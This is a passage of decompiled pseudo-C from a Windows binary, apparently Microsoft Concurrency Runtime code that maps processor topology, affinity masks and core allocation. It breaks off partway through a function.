//----- (0044CCAC) --------------------------------------------------------
int __thiscall sub_44CCAC(_DWORD *this, unsigned int *a2)
{
  int v3; // eax
  int v4; // edx
  int v5; // eax
  int v6; // edi
  _DWORD *v7; // ecx
  unsigned int v8; // edx
  _BYTE *v9; // esi
  int v11; // ebx
  int v12; // eax
  _DWORD *v13; // ecx
  unsigned __int8 *v14; // esi
  char pExceptionObject[12]; // [esp+Ch] [ebp-14h] BYREF
  int v16; // [esp+18h] [ebp-8h]
  unsigned __int16 v17; // [esp+1Ch] [ebp-4h] BYREF
  char v18; // [esp+1Eh] [ebp-2h]

  v3 = sub_44ED58();
  if ( v3 >= 4 )
  {
    sub_44A756((int)&v17);
    v4 = v17;
    v5 = 1 << (v18 & 0x1F);
    v6 = 0;
    v7 = (_DWORD *)this[18];
    v16 = v5;
    while ( 1 )
    {
      if ( v7[3] == v4 && (v5 & *v7) != 0 )
      {
        v8 = 0;
        if ( v7[1] )
        {
          v9 = (_BYTE *)(v7[8] + 8);
          while ( *v9 != (v18 & 0x1F) )
          {
            ++v8;
            v9 += 36;
            if ( v8 >= v7[1] )
            {
              v5 = v16;
              goto LABEL_10;
            }
          }
LABEL_26:
          if ( a2 )
            *a2 = v8;
          return v6;
        }
LABEL_10:
        v4 = v17;
      }
      ++v6;
      v7 += 10;
    }
  }
  if ( v3 == 2 || v3 == 3 )
  {
    v11 = __crtGetCurrentProcessorNumber() & 0x1F;
    v12 = 1 << v11;
    v6 = 0;
    v13 = (_DWORD *)this[18];
    v16 = 1 << v11;
    while ( 1 )
    {
      if ( (v12 & *v13) != 0 )
      {
        v8 = 0;
        if ( v13[1] )
        {
          v14 = (unsigned __int8 *)(v13[8] + 8);
          do
          {
            if ( *v14 == v11 )
              goto LABEL_26;
            ++v8;
            v14 += 36;
          }
          while ( v8 < v13[1] );
          v12 = v16;
        }
      }
      ++v6;
      v13 += 10;
    }
  }
  if ( dword_500024 != 1 )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVunsupported_os_Concurrency__);
  }
  if ( a2 )
    *a2 = 0;
  return 0;
}
// 434851: using guessed type int __crtGetCurrentProcessorNumber(void);
// 500024: using guessed type int dword_500024;

//----- (0044CDA5) --------------------------------------------------------
int __thiscall sub_44CDA5(_DWORD *this)
{
  return *(_DWORD *)(this[1] + 4);
}

//----- (0044CDAC) --------------------------------------------------------
int __thiscall sub_44CDAC(_DWORD *this)
{
  return *(_DWORD *)(*(_DWORD *)(this[1] + 32) + 32);
}

//----- (0044CDB6) --------------------------------------------------------
int __thiscall sub_44CDB6(_DWORD *this)
{
  return *(_DWORD *)(this[18] + 36);
}

//----- (0044CDBD) --------------------------------------------------------
int __thiscall sub_44CDBD(_DWORD *this)
{
  return *(_DWORD *)(this[1] + 16);
}

//----- (0044CDC4) --------------------------------------------------------
int __thiscall sub_44CDC4(int *this)
{
  int v1; // eax

  v1 = sub_44CDF2(*(_DWORD **)(this[1] + 12), this[1]);
  if ( v1 )
    return *(_DWORD *)(v1 + 32);
  else
    return 0;
}

//----- (0044CDDB) --------------------------------------------------------
int __thiscall sub_44CDDB(int *this)
{
  int v1; // eax

  v1 = sub_44CE17(*(_DWORD **)(this[1] + 24), this[1]);
  if ( v1 )
    return *(_DWORD *)(v1 + 36);
  else
    return 0;
}

//----- (0044CDF2) --------------------------------------------------------
int __thiscall sub_44CDF2(_DWORD *this, int a2)
{
  unsigned int v2; // eax

  v2 = (a2 - this[8]) / 36 + 1;
  if ( v2 >= this[1] )
    return 0;
  else
    return this[8] + 36 * v2;
}

//----- (0044CE17) --------------------------------------------------------
int __thiscall sub_44CE17(_DWORD *this, int a2)
{
  unsigned int v2; // eax

  v2 = (a2 - this[18]) / 40 + 1;
  if ( v2 >= this[6] )
    return 0;
  else
    return this[18] + 40 * v2;
}

//----- (0044CE3C) --------------------------------------------------------
int sub_44CE3C()
{
  int result; // eax

  result = dword_50001C;
  if ( !dword_50001C )
  {
    sub_44AE22(&dword_500068);
    result = dword_50001C;
    if ( !dword_50001C )
    {
      sub_44D376(0);
      result = dword_50001C;
    }
    dword_500068 = 0;
  }
  return result;
}
// 50001C: using guessed type int dword_50001C;
// 500068: using guessed type int dword_500068;

//----- (0044CE87) --------------------------------------------------------
int __thiscall sub_44CE87(_DWORD *this)
{
  return *(_DWORD *)(this[1] + 20);
}

//----- (0044CEAA) --------------------------------------------------------
void *__cdecl sub_44CEAA(int a1)
{
  void *result; // eax

  if ( dword_500024 < 4 )
    result = sub_44A778(&ReturnedLength);
  else
    result = sub_44A7FF(a1, &ReturnedLength);
  Block = result;
  return result;
}
// 500024: using guessed type int dword_500024;

//----- (0044CED3) --------------------------------------------------------
unsigned int __thiscall sub_44CED3(_DWORD *this, _DWORD *a2, _DWORD *a3)
{
  _DWORD *v3; // edx
  unsigned int result; // eax
  int v5; // ecx
  _DWORD *v6; // esi
  unsigned int v7; // ebx
  int v8; // eax
  int v9; // edi
  _DWORD *v10; // eax
  int v11; // ecx
  unsigned int v12; // [esp+8h] [ebp-18h]
  int v13; // [esp+10h] [ebp-10h]
  int v14; // [esp+14h] [ebp-Ch]
  int v16; // [esp+1Ch] [ebp-4h]

  v3 = this;
  result = 0;
  v12 = 0;
  if ( this[6] )
  {
    v5 = 0;
    v6 = (_DWORD *)(a2[4] + 44);
    v16 = 0;
    do
    {
      if ( *(v6 - 3) )
      {
        v7 = 0;
        if ( *(v6 - 10) )
        {
          v14 = 0;
          v8 = 0;
          v13 = 0;
          do
          {
            v9 = v8 + v6[1];
            if ( *(_DWORD *)v9 == 4 && *(_BYTE *)(v9 + 49) )
            {
              v10 = (_DWORD *)(v14 + *(_DWORD *)(v5 + v3[18] + 32));
              v11 = v10[4];
              if ( v11 == 1 )
              {
                sub_4563E9(a2, (int)(v6 - 11), v7);
                v3 = this;
                v5 = v16;
                if ( *(_BYTE *)(v9 + 48) )
                {
                  --*v6;
                  --a3[6];
                }
              }
              else
              {
                if ( v11 - v10[7] > (unsigned int)(*(_BYTE *)(v9 + 48) == 0) )
                {
                  v10[4] = v11 - 1;
                  if ( *(_BYTE *)(v9 + 48) )
                    sub_44ECF1(v3, (int)(v6 - 11), v9, (_DWORD *)(v16 + v3[18]), v10, a3);
                  sub_4561E2(a2, (int)(v6 - 11), v7);
                  v3 = this;
                }
                v5 = v16;
              }
            }
            v13 += 52;
            ++v7;
            v14 += 36;
            v8 = v13;
          }
          while ( v7 < *(v6 - 10) );
          result = v12;
        }
      }
      ++result;
      v5 += 40;
      v6 += 13;
      v12 = result;
      v16 = v5;
    }
    while ( result < v3[6] );
  }
  return result;
}

//----- (0044CFED) --------------------------------------------------------
unsigned int __thiscall sub_44CFED(_DWORD *this, _DWORD *a2, _DWORD *a3)
{
  unsigned int v3; // eax
  int v4; // esi
  int v5; // edi
  unsigned int v6; // esi
  unsigned int result; // eax
  unsigned int v8; // edx
  _DWORD *v9; // edi
  unsigned int v10; // ecx
  int v11; // edx
  int v12; // ecx
  _DWORD *v13; // edx
  unsigned int v14; // eax
  unsigned int v15; // [esp+10h] [ebp-18h]
  unsigned int v16; // [esp+14h] [ebp-14h]
  int v17; // [esp+18h] [ebp-10h]
  int v18; // [esp+1Ch] [ebp-Ch]
  int v20; // [esp+24h] [ebp-4h]

  v3 = sub_44D60B(a2);
  v4 = a2[40];
  v5 = v4 - a2[42];
  v6 = v4 - a3[9] - a3[6];
  result = v5 - (a2[46] + v3);
  if ( v6 >= result )
  {
    result = a2[46] + sub_44D60B(a2);
    v6 = v5 - result;
  }
  v8 = 0;
  v15 = 0;
  if ( v6 )
  {
    v18 = 0;
    v9 = (_DWORD *)(a2[4] + 36);
    do
    {
      result = (unsigned int)this;
      if ( v8 >= this[6] )
        break;
      result = *(v9 - 2) - *v9;
      if ( result )
      {
        v10 = 0;
        v17 = 0;
        v20 = 0;
        result = 0;
        v11 = 0;
        v16 = 0;
        do
        {
          if ( v10 >= *(v9 - 8) )
            break;
          v12 = result + v9[3];
          if ( *(_DWORD *)v12 == 4 && !*(_DWORD *)(v12 + 40) && !*(_BYTE *)(v12 + 49) )
          {
            v13 = (_DWORD *)(v20 + *(_DWORD *)(this[18] + v18 + 32));
            v14 = v13[4];
            if ( v14 > 1 )
            {
              v13[4] = v14 - 1;
              if ( *(_BYTE *)(v12 + 48) )
                sub_44ECF1(this, (int)(v9 - 9), v12, (_DWORD *)(v18 + this[18]), v13, a3);
              sub_4561E2(a2, (int)(v9 - 9), v17);
              --v6;
            }
            v11 = v20;
            result = v16;
          }
          result += 52;
          v10 = v17 + 1;
          v16 = result;
          v11 += 36;
          ++v17;
          v20 = v11;
        }
        while ( v6 );
        v8 = v15;
      }
      v18 += 40;
      ++v8;
      v9 += 13;
      v15 = v8;
    }
    while ( v6 );
  }
  return result;
}
// 44D06F: conditional instruction was optimized away because esi.4!=0

//----- (0044D12E) --------------------------------------------------------
void __thiscall sub_44D12E(_DWORD *this)
{
  unsigned int i; // esi
  int v3; // ebx
  unsigned int v4; // eax

  for ( i = 0; i < this[2]; ++i )
  {
    v3 = *(_DWORD *)(this[21] + 4 * i);
    if ( *(_BYTE *)(v3 + 33) == 1 )
    {
      v4 = sub_44B917(*(_DWORD **)(v3 + 16));
      *(_DWORD *)(v3 + 36) = sub_455776(*(_DWORD **)(v3 + 16), v4);
    }
  }
}

//----- (0044D164) --------------------------------------------------------
char __thiscall sub_44D164(int this, int a2, int a3, char a4)
{
  _DWORD *v5; // eax
  char result; // al

  v5 = operator new(8u);
  if ( v5 )
  {
    *v5 = &Concurrency::details::GlobalCore::TopologyObject::`vftable';
    v5[1] = this;
  }
  else
  {
    v5 = 0;
  }
  *(_DWORD *)(this + 32) = v5;
  *(_DWORD *)(this + 12) = a2;
  *(_DWORD *)(this + 4) = a3;
  result = a4;
  *(_BYTE *)(this + 8) = a4;
  return result;
}
// 4939C4: using guessed type void *Concurrency::details::GlobalCore::TopologyObject::`vftable';

//----- (0044D1A1) --------------------------------------------------------
unsigned int __thiscall sub_44D1A1(
        unsigned int *this,
        unsigned int a2,
        unsigned __int16 a3,
        unsigned __int16 a4,
        unsigned int a5,
        unsigned int a6,
        char a7)
{
  _DWORD *v8; // eax
  int v9; // ebx
  signed int v10; // ecx
  unsigned __int16 v11; // dx
  unsigned int v12; // eax
  unsigned int v13; // edi
  int v14; // ecx
  unsigned int *v15; // eax
  void *v16; // ecx
  size_t v17; // eax
  unsigned int result; // eax
  unsigned int v19; // edx
  int v20; // edi
  unsigned int v21; // ecx
  int v22; // eax
  int v23; // ecx
  char v24; // [esp-4h] [ebp-1Ch]
  unsigned int v25; // [esp+10h] [ebp-8h]
  unsigned int v26; // [esp+14h] [ebp-4h]

  v8 = operator new(8u);
  v9 = 0;
  if ( v8 )
  {
    *v8 = &Concurrency::details::GlobalNode::TopologyObject::`vftable';
    v8[1] = this;
  }
  else
  {
    v8 = 0;
  }
  this[9] = (unsigned int)v8;
  this[6] = a2;
  this[4] = a3;
  this[3] = a4;
  v26 = a5;
  *this = a5;
  if ( a6 )
  {
    v12 = a6;
  }
  else
  {
    v10 = a5;
    v11 = 0;
    if ( a5 )
    {
      do
      {
        ++v11;
        v10 &= v10 - 1;
      }
      while ( v10 );
    }
    v12 = v11;
  }
  this[1] = v12;
  v13 = v12;
  this[2] = 0;
  v14 = (36 * (unsigned __int64)v12) >> 32 != 0 ? -1 : 36 * v12;
  v15 = (unsigned int *)unknown_libname_86(__CFADD__(v14, 4) ? -1 : v14 + 4);
  if ( v15 )
  {
    *v15 = v13;
    v16 = v15 + 1;
  }
  else
  {
    v16 = 0;
  }
  v17 = 36 * this[1];
  this[8] = (unsigned int)v16;
  result = (unsigned int)memset(v16, 0, v17);
  v19 = 0;
  if ( this[1] )
  {
    result = a5;
    v20 = 0;
    v21 = a6;
    while ( !v21 )
    {
      if ( (result & 1) != 0 )
      {
        v22 = this[3];
        v24 = v9;
LABEL_18:
        v23 = v20 + this[8];
        v20 += 36;
        v25 = v19 + 1;
        sub_44D164(v23, (int)this, v9 + (v22 << 8), v24);
        v21 = a6;
        v19 = v25;
        result = v26;
      }
      result >>= 1;
      ++v9;
      v26 = result;
      if ( v19 >= this[1] )
        return result;
    }
    v24 = v9 + a7;
    v22 = a3 + (this[3] << 8);
    goto LABEL_18;
  }
  return result;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);
// 4939D0: using guessed type void *Concurrency::details::GlobalNode::TopologyObject::`vftable';

//----- (0044D2B4) --------------------------------------------------------
void *__thiscall sub_44D2B4(int this)
{
  unsigned int v2; // eax
  void *result; // eax
  void *v4; // [esp-8h] [ebp-10h]

  v2 = *(_DWORD *)(this + 12);
  if ( v2 < *(_DWORD *)(this + 8) )
  {
    do
      v2 *= 2;
    while ( v2 < *(_DWORD *)(this + 8) );
    v4 = *(void **)(this + 84);
    *(_DWORD *)(this + 12) = v2;
    j_j__free(v4);
    j_j__free(*(void **)(this + 88));
    j_j__free(*(void **)(this + 92));
    *(_DWORD *)(this + 84) = unknown_libname_86(
                               (unsigned __int64)*(unsigned int *)(this + 12) >> 30 != 0
                             ? -1
                             : 4 * *(_DWORD *)(this + 12));
    if ( *(_DWORD *)(this + 88) )
    {
      *(_DWORD *)(this + 88) = unknown_libname_86(
                                 (unsigned __int64)*(unsigned int *)(this + 12) >> 30 != 0
                               ? -1
                               : 4 * *(_DWORD *)(this + 12));
      *(_DWORD *)(this + 92) = unknown_libname_86(
                                 (unsigned __int64)*(unsigned int *)(this + 12) >> 30 != 0
                               ? -1
                               : 4 * *(_DWORD *)(this + 12));
    }
  }
  result = memset(*(void **)(this + 84), 0, 4 * *(_DWORD *)(this + 8));
  if ( *(_DWORD *)(this + 88) )
  {
    memset(*(void **)(this + 88), 0, 4 * *(_DWORD *)(this + 8));
    return memset(*(void **)(this + 92), 0, 4 * *(_DWORD *)(this + 8));
  }
  return result;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (0044D376) --------------------------------------------------------
void __cdecl sub_44D376(char a1)
{
  int v1; // eax
  int v2; // ecx
  char *v3; // edi
  int v4; // esi
  unsigned int v5; // ecx
  unsigned int v6; // edx
  int v7; // eax
  unsigned int v8; // ecx
  unsigned __int8 v9; // dl
  char *v10; // esi
  int v11; // ecx
  unsigned __int16 i; // dx
  int *v13; // esi
  unsigned int v14; // edi
  int v15; // eax
  int v16; // eax
  int v17; // ecx
  unsigned __int16 j; // dx
  ULONG_PTR v19; // ecx
  unsigned __int16 k; // dx
  char *v21; // [esp+0h] [ebp-18h]
  int *v22; // [esp+0h] [ebp-18h]
  int v23; // [esp+4h] [ebp-14h]
  int v24; // [esp+8h] [ebp-10h]
  int v25; // [esp+8h] [ebp-10h]
  unsigned int v26; // [esp+Ch] [ebp-Ch]
  unsigned int v27; // [esp+10h] [ebp-8h]
  unsigned int v28; // [esp+10h] [ebp-8h]
  unsigned __int8 v29; // [esp+17h] [ebp-1h]

  v1 = dword_500024;
  if ( !dword_500024 )
  {
    sub_44E676();
    v1 = dword_500024;
  }
  v2 = dword_50000C;
  if ( !dword_50000C )
  {
    sub_44B383();
    v1 = dword_500024;
    v2 = dword_50000C;
  }
  if ( v1 >= 4 )
  {
    sub_44CEAA(0xFFFF);
    v3 = (char *)Block;
    v4 = 0;
    v24 = 0;
    v21 = (char *)Block + ReturnedLength;
    v5 = 0;
    v27 = 0;
    v6 = 0;
    v26 = 0;
    if ( Block < (char *)Block + ReturnedLength )
    {
      while ( *(_DWORD *)v3 )
      {
        if ( *(_DWORD *)v3 != 1 )
        {
          if ( *(_DWORD *)v3 == 3 )
          {
            v29 = 0;
            LOWORD(v7) = 0;
            v8 = v27;
            v9 = 0;
            v23 = 0;
            if ( *((_WORD *)v3 + 15) )
            {
              do
              {
                v10 = &v3[12 * (unsigned __int16)v7 + 32];
                sub_44B34A(v10);
                v9 = (*(_DWORD *)v10 != 0) | v29;
                v7 = v23 + 1;
                v29 = v9;
                v23 = v7;
              }
              while ( (unsigned __int16)v7 < *((_WORD *)v3 + 15) );
              v8 = v27;
              v4 = v24;
            }
            v5 = v9 + v8;
            v27 = v5;
          }
LABEL_18:
          v6 = v26;
          goto LABEL_19;
        }
        sub_44B34A((_DWORD *)v3 + 8);
        v4 = v24;
        v5 = v27;
        v6 = (*((_DWORD *)v3 + 8) != 0) + v26;
        v26 = v6;
LABEL_19:
        v3 += *((_DWORD *)v3 + 1);
        if ( v3 >= v21 )
          goto LABEL_20;
      }
      sub_44B34A((_DWORD *)v3 + 8);
      v11 = *((_DWORD *)v3 + 8);
      for ( i = 0; v11; v11 &= v11 - 1 )
        ++i;
      v5 = v27;
      v4 = i + v24;
      v24 = v4;
      goto LABEL_18;
    }
LABEL_20:
    byte_500018 = v5 > v6;
    if ( v5 <= v6 )
      v5 = v6;
    dword_500014 = v4;
    dword_500020 = v6;
    goto LABEL_39;
  }
  if ( v1 == 3 )
  {
    sub_44CEAA(0xFFFF);
    v13 = (int *)Block;
    v14 = 0;
    v5 = 0;
    v25 = 0;
    v28 = 0;
    v22 = (int *)((char *)Block + 24 * (ReturnedLength / 0x18));
    if ( Block < v22 )
    {
      do
      {
        v15 = v13[1];
        if ( v15 )
        {
          v16 = v15 - 1;
          if ( v16 )
          {
            if ( v16 == 2 )
            {
              sub_44B31F(v13);
              v5 = v28;
              if ( *v13 )
                v5 = ++v28;
            }
          }
          else
          {
            sub_44B31F(v13);
            v5 = v28;
            if ( *v13 )
              ++v14;
          }
        }
        else
        {
          sub_44B31F(v13);
          v17 = *v13;
          for ( j = 0; v17; v17 &= v17 - 1 )
            ++j;
          v5 = v28;
          v25 += j;
        }
        v13 += 6;
      }
      while ( v13 < v22 );
    }
    byte_500018 = v5 > v14;
    if ( v5 <= v14 )
      v5 = v14;
    dword_500014 = v25;
    dword_500020 = v14;
LABEL_39:
    dword_50001C = v5;
    if ( !a1 )
      sub_44B4A8();
    goto LABEL_47;
  }
  dword_50001C = 1;
  byte_500018 = 0;
  if ( v2 )
  {
    sub_44B383();
    v19 = ProcessAffinityMask & *(_DWORD *)sub_44CBF9((_DWORD *)dword_50000C, 0);
  }
  else
  {
    v19 = ProcessAffinityMask;
  }
  for ( k = 0; v19; v19 &= v19 - 1 )
    ++k;
  dword_500014 = k;
  dword_500020 = 1;
LABEL_47:
  if ( dword_500010 )
    sub_44B1CA((void **)dword_500010, 1);
  dword_500010 = 0;
}
// 50000C: using guessed type int dword_50000C;
// 500014: using guessed type int dword_500014;
// 500018: using guessed type char byte_500018;
// 50001C: using guessed type int dword_50001C;
// 500020: using guessed type int dword_500020;
// 500024: using guessed type int dword_500024;

//----- (0044D60B) --------------------------------------------------------
unsigned int __thiscall sub_44D60B(_DWORD *this)
{
  unsigned int result; // eax
  unsigned int v2; // ecx

  result = this[43] - this[46];
  v2 = this[33];
  if ( result <= v2 )
    return v2;
  return result;
}

//----- (0044D624) --------------------------------------------------------
_DWORD *__thiscall sub_44D624(unsigned int *this, _DWORD *a2, int a3, char a4)
{
  unsigned int v5; // ebx
  unsigned int v6; // ecx
  BOOL v7; // eax
  _DWORD *v8; // ebx
  unsigned int v10; // [esp+Ch] [ebp-14h]
  unsigned int v11; // [esp+10h] [ebp-10h]
  unsigned int v12; // [esp+14h] [ebp-Ch]
  unsigned int v13; // [esp+18h] [ebp-8h]
  char v14; // [esp+1Fh] [ebp-1h]

  if ( (_BYTE)a3 )
    a2[4] = sub_44B620(this);
  v5 = 0;
  v10 = a2[40];
  if ( a4 )
  {
    v11 = sub_44B5F3(a2);
    v6 = sub_44B5D0(a2);
    v13 = v6;
    if ( (_BYTE)a3 )
    {
      v7 = v11;
    }
    else
    {
      v6 = a2[46] + sub_44D60B(a2) < this[7];
      v13 = v6;
      v7 = v10 < v11;
    }
    v12 = v7;
  }
  else
  {
    v11 = a2[46] + sub_44D60B(a2);
    v12 = v11;
    v6 = sub_44B917(a2);
    v13 = v6;
  }
  v14 = 0;
  if ( v6 )
  {
    sub_44EB07(this, (int)a2, a4);
    sub_44DA2A(this);
    v5 = sub_44E444(this, (int)a2, v13, 0);
    if ( v5 < v13 && ((_BYTE)a3 || v12) )
    {
      v14 = 1;
      v5 += sub_44E10F(this, (int)a2, v13 - v5, -2);
      if ( v5 < v13 )
      {
        v5 += sub_44DC6B(this, (int)a2, v5 + v10, v11, v10 + v13);
        if ( v5 < v12 )
        {
          v5 += sub_44E10F(this, (int)a2, v12 - v5, -1);
          if ( v5 < v12 )
            v5 += sub_44E410(this, (int)a2, v12 - v5);
        }
      }
    }
    sub_44E61F(this);
  }
  v8 = sub_455D26((int)a2, v5, a3, a4);
  if ( v14 )
    sub_44B4C3(this, (int)a2);
  return v8;
}

//----- (0044D77A) --------------------------------------------------------
int __thiscall sub_44D77A(_DWORD *this, int a2, int a3, int a4)
{
  int result; // eax
  int v5; // esi
  unsigned int v6; // ebx
  _DWORD *v7; // esi
  unsigned int v8; // ecx
  int v9; // edx
  bool v10; // zf
  int v11; // [esp+8h] [ebp-18h]
  unsigned int v12; // [esp+Ch] [ebp-14h]
  _DWORD *v13; // [esp+10h] [ebp-10h]
  int v14; // [esp+14h] [ebp-Ch]
  int v15; // [esp+18h] [ebp-8h]
  unsigned int v16; // [esp+1Ch] [ebp-4h]

  v13 = this;
  *(_DWORD *)a4 = a2;
  result = a3;
  *(double *)(a4 + 8) = 0.0;
  *(_DWORD *)(a4 + 16) = a3;
  v5 = *(_DWORD *)(a3 + 16);
  if ( v5 )
  {
    v6 = 0;
    v12 = 0;
    if ( this[6] )
    {
      result = 0;
      v7 = (_DWORD *)(v5 + 44);
      v11 = 0;
      do
      {
        *(v7 - 1) = 0;
        *v7 = 0;
        if ( *(v7 - 4) )
        {
          v16 = 0;
          if ( *(v7 - 10) )
          {
            v8 = 0;
            v14 = 0;
            v15 = 0;
            do
            {
              v9 = v15 + v7[1];
              v10 = *(_DWORD *)v9 == 4;
              *(_BYTE *)(v9 + 48) = 0;
              if ( v10 && !*(_DWORD *)(v9 + 24) )
              {
                sub_44ECF1(
                  v13,
                  (int)(v7 - 11),
                  v9,
                  (_DWORD *)(result + v13[18]),
                  (_DWORD *)(v14 + *(_DWORD *)(result + v13[18] + 32)),
                  (_DWORD *)a4);
                result = v11;
                v8 = v16;
              }
              v15 += 52;
              ++v8;
              v14 += 36;
              v16 = v8;
            }
            while ( v8 < *(v7 - 10) );
            v6 = v12;
            this = v13;
          }
        }
        ++v6;
        result += 40;
        v7 += 13;
        v12 = v6;
        v11 = result;
      }
      while ( v6 < this[6] );
    }
  }
  return result;
}

//----- (0044D840) --------------------------------------------------------
_DWORD *__thiscall sub_44D840(_DWORD *this)
{
  _DWORD *v1; // esi
  int v2; // edi
  _DWORD *result; // eax
  int v4; // ebx
  int v5; // ebx
  int v6; // edi
  unsigned int v7; // eax
  unsigned int v8; // eax
  unsigned int v9; // edi
  char v10; // al
  unsigned int v12; // [esp+10h] [ebp-14h]
  int v13; // [esp+14h] [ebp-10h]
  unsigned int v14; // [esp+18h] [ebp-Ch] BYREF
  int v15; // [esp+1Ch] [ebp-8h] BYREF
  unsigned int v16; // [esp+20h] [ebp-4h] BYREF

  v1 = this;
  v2 = 0;
  v13 = 0;
  result = sub_44D2B4((int)this);
  v4 = v1[25];
  if ( v4 )
  {
    v5 = *(_DWORD *)(v4 + 24);
    if ( v5 )
    {
      while ( 1 )
      {
        memset((void *)(v5 + 64), 0, 0x38u);
        sub_44D77A(v1, v2, v5, v5 + 64);
        v12 = *(_DWORD *)(v5 + 160);
        if ( *(_BYTE *)(v5 + 204) )
        {
          v6 = *(_DWORD *)(v5 + 8);
          v7 = *(_DWORD *)(v5 + 120);
          v14 = 0;
          v15 = 0;
          v16 = v7;
          (*(void (__thiscall **)(int, unsigned int *, int *, unsigned int *))(*(_DWORD *)v6 + 4))(v6, &v14, &v15, &v16);
          v8 = sub_4550A8(*(_DWORD *)(v5 + 56), v12, v14, v15, v16);
          *(_DWORD *)(v5 + 100) = v8;
          if ( v8 > *(_DWORD *)(v5 + 160) )
            *(_DWORD *)(v5 + 100) = sub_455776((_DWORD *)v5, v8);
          v1 = this;
          *(_DWORD *)(v5 + 120) = v16;
        }
        else
        {
          *(_DWORD *)(v5 + 100) = *(_DWORD *)(v5 + 160);
        }
        v9 = *(_DWORD *)(v5 + 160);
        if ( v9 )
        {
          if ( *(_DWORD *)(v5 + 84) || v9 > *(_DWORD *)(v5 + 100) )
          {
LABEL_11:
            v10 = 0;
            goto LABEL_12;
          }
        }
        else if ( !*(_DWORD *)(v5 + 196) )
        {
          goto LABEL_11;
        }
        if ( v9 >= sub_44B917((_DWORD *)v5) )
          goto LABEL_11;
        v10 = 1;
LABEL_12:
        *(_BYTE *)(v5 + 97) = v10;
        result = (_DWORD *)v1[21];
        result[v13] = v5 + 64;
        v2 = ++v13;
        if ( v5 != v1[25] )
        {
          result = *(_DWORD **)(v5 + 24);
          v5 = (int)result;
          if ( result )
            continue;
        }
        return result;
      }
    }
  }
  return result;
}

//----- (0044D95C) --------------------------------------------------------
void __thiscall sub_44D95C(_DWORD *this)
{
  unsigned int v2; // ecx
  int v3; // eax
  _DWORD *v4; // edi
  int v5; // esi
  unsigned int v6; // ebx
  unsigned int v7; // eax
  unsigned int i; // [esp+8h] [ebp-8h]
  _DWORD *v9; // [esp+Ch] [ebp-4h]

  v2 = 0;
  v9 = this;
  for ( i = 0; v2 < this[2]; i = v2 )
  {
    v3 = this[21];
    v4 = *(_DWORD **)(v3 + 4 * v2);
    v5 = v4[4];
    if ( *(_DWORD *)(v5 + 168) )
      sub_44CED3(this, (_DWORD *)v5, *(_DWORD **)(v3 + 4 * v2));
    if ( v4[5] )
    {
      v6 = *(_DWORD *)(v5 + 160) - v4[5];
      if ( v4[9] > v6 )
      {
        if ( *(_DWORD *)(v5 + 184) + sub_44D60B((_DWORD *)v5) > v6 )
          v6 = *(_DWORD *)(v5 + 184) + sub_44D60B((_DWORD *)v5);
        v4[9] = v6;
      }
      this = v9;
    }
    if ( v4[9] < *(_DWORD *)(v5 + 160)
      && *(_DWORD *)(v5 + 160) - *(_DWORD *)(v5 + 168) > *(_DWORD *)(v5 + 184) + sub_44D60B((_DWORD *)v5) )
    {
      sub_44CFED(this, (_DWORD *)v5, v4);
    }
    if ( !*(_BYTE *)(v5 + 204) )
    {
      v7 = *(_DWORD *)(v5 + 160);
      if ( v4[9] > v7 )
        v4[9] = v7;
    }
    v2 = i + 1;
  }
}

//----- (0044DA2A) --------------------------------------------------------
unsigned int __thiscall sub_44DA2A(_DWORD *this)
{
  unsigned int i; // esi
  unsigned int result; // eax
  _DWORD *v4; // ecx

  for ( i = 0; i < this[2]; ++i )
  {
    result = *(_DWORD *)(this[21] + 4 * i);
    v4 = *(_DWORD **)(result + 16);
    if ( v4[42] )
      result = sub_44CED3(this, v4, *(_DWORD **)(this[21] + 4 * i));
  }
  return result;
}

//----- (0044DA59) --------------------------------------------------------
unsigned int __thiscall sub_44DA59(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // esi
  unsigned int v4; // ecx
  int v5; // edx
  int v6; // ebx
  int v7; // eax
  unsigned int v8; // ecx
  int v9; // eax
  unsigned int v10; // ebx
  _DWORD *v11; // edx
  int v12; // eax
  int v13; // edx
  int v14; // ebx
  unsigned int v15; // ebx
  unsigned int v16; // edx
  int v17; // ebx
  unsigned int v18; // eax
  int v19; // ecx
  int v20; // edx
  int v21; // ecx
  int v22; // eax
  int v23; // edx
  int v24; // eax
  unsigned int v25; // edx
  int v26; // esi
  unsigned int v27; // eax
  unsigned int v28; // ecx
  int v29; // ebx
  unsigned int v30; // edi
  int v31; // edx
  unsigned int v32; // eax
  unsigned int v33; // eax
  bool v34; // zf
  unsigned int j; // [esp+Ch] [ebp-2Ch]
  unsigned int v37; // [esp+10h] [ebp-28h]
  int v38; // [esp+14h] [ebp-24h]
  unsigned int v39; // [esp+18h] [ebp-20h]
  unsigned int v40; // [esp+20h] [ebp-18h]
  unsigned int v41; // [esp+24h] [ebp-14h]
  _DWORD *i; // [esp+28h] [ebp-10h]
  unsigned int v43; // [esp+2Ch] [ebp-Ch]
  int v44; // [esp+30h] [ebp-8h]
  int v45; // [esp+30h] [ebp-8h]
  unsigned int v46; // [esp+30h] [ebp-8h]
  unsigned int v47; // [esp+34h] [ebp-4h]
  int v48; // [esp+34h] [ebp-4h]

  v2 = a2;
  v4 = 0;
  for ( i = this; v4 < v2; *(_BYTE *)(v7 + 32) = 1 )
  {
    do
    {
      v5 = this[23];
      v6 = *(_DWORD *)(v5 + 4 * v4);
      if ( *(_DWORD *)(v6 + 4) )
        break;
      --v2;
      *(_DWORD *)(v5 + 4 * v4) = *(_DWORD *)(v5 + 4 * v2);
      *(_DWORD *)(this[23] + 4 * v2) = v6;
    }
    while ( v4 < v2 );
    a2 = v2;
    *(_DWORD *)(*(_DWORD *)(this[23] + 4 * v4) + 40) = 0;
    *(_DWORD *)(*(_DWORD *)(this[23] + 4 * v4) + 44) = 0;
    v7 = *(_DWORD *)(this[23] + 4 * v4++);
  }
  v8 = 0;
  for ( j = v2; v8 < v2; ++v8 )
  {
    do
    {
      v9 = *(_DWORD *)(this[23] + 4 * v8);
      if ( *(_DWORD *)(v9 + 40) )
        break;
      v10 = 0;
      if ( this[6] )
      {
        v11 = (_DWORD *)(*(_DWORD *)(*(_DWORD *)(v9 + 16) + 16) + 28);
        do
        {
          if ( *v11 && *v11 < *(v11 - 6) )
          {
            v12 = *(_DWORD *)(this[23] + 4 * v8);
            ++*(_DWORD *)(v12 + 40);
          }
          ++v10;
          v11 += 13;
        }
        while ( v10 < this[6] );
      }
      v13 = this[23];
